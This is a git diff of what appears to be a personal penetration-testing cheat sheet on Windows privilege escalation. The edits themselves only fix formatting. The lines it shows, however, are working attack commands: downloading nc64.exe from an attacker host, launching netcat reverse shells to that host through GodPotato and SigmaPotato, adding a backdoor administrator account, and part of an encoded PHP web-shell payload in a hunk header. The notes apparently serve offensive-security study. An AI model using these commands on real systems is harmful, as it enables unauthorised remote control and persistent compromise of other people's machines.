@@ -916,7 +916,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     iwr -uri http://<kali>/nc64.exe -OutFile 'nc64.exe'
     .\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe <kali> 4444"
     ```
- - 🖥️ **SigmaPotato.exe**  
+  - 🖥️ **SigmaPotato.exe**  
     ```
     .\SigmaPotato "net user dave4 lab /add
     .\SigmaPotato "net localgroup Administrators dave4 /add"
@@ -925,7 +925,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 | Exploit       | Works On                           | Privilege Required              | Command Example                                                                 |
 |---------------|------------------------------------|---------------------------------|---------------------------------------------------------------------------------|
 | **PrintSpoofer** (2020) | Win10 1903+, Server 2019 | `SeImpersonatePrivilege`        | `.\printspoofer.exe -i -c powershell.exe`                                                |
-| **GodPotato** (2021)    | Win10, Server 2019+      | `SeImpersonatePrivilege`        | `.\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe <kali> 443`                                                  |
+| **GodPotato** (2021)    | Win10, Server 2019+      | `SeImpersonatePrivilege`        | `.\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe <kali> 443`"                                                 |
 | **SigmaPotato** (2022+) | Win10/11, Server 2016–2022 | `SeImpersonatePrivilege`        | `.\SigmaPotato.exe --revshell <kali ip> 443`                                               |
 
 # Linux priviledge  
